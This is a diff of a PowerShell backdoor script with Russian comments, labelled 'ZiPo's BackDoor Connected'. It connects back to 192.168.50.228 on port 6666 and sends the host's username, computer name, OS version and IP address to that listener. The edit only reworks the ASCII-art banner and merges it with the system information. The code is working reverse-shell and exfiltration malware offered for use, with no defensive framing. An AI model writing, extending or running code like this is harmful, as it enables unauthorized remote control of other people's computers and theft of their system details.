@@ -2,16 +2,19 @@ $client = New-Object System.Net.Sockets.TCPClient("192.168.50.228",6666);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 
-# Баннер и инфа о системе
+# ASCII-совместимый баннер
 $banner = @"
-███████╗██╗██████╗  ██████╗ ███████╗
-██╔════╝██║██╔══██╗██╔════╝ ██╔════╝
-███████╗██║██████╔╝██║  ███╗█████╗  
-╚════██║██║██╔═══╝ ██║   ██║██╔══╝  
-███████║██║██║     ╚██████╔╝███████╗
-╚══════╝╚═╝╚═╝      ╚═════╝ ╚══════╝
-ZiPo's BackDoor Connected
+ ________  .__              __________                .___           
+ \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
+  |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \\
+  |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
+ /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
+         \/        \/\/                                      \/    \/ 
+             ZiPo's BackDoor Connected
+"@
 
+# Системная информация
+$sysinfo = @"
 Username: $env:USERNAME
 Computer: $env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
@@ -21,8 +24,9 @@ IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressT
 ---------------------------------------------------
 "@
 
-# Отправка баннера
-$introBytes = [System.Text.Encoding]::ASCII.GetBytes($banner)
+# Объединённый текст
+$allInfo = "$banner`n$sysinfo"
+$introBytes = [System.Text.Encoding]::ASCII.GetBytes($allInfo)
 $stream.Write($introBytes, 0, $introBytes.Length)
 $stream.Flush()
 Start-Sleep -Milliseconds 300
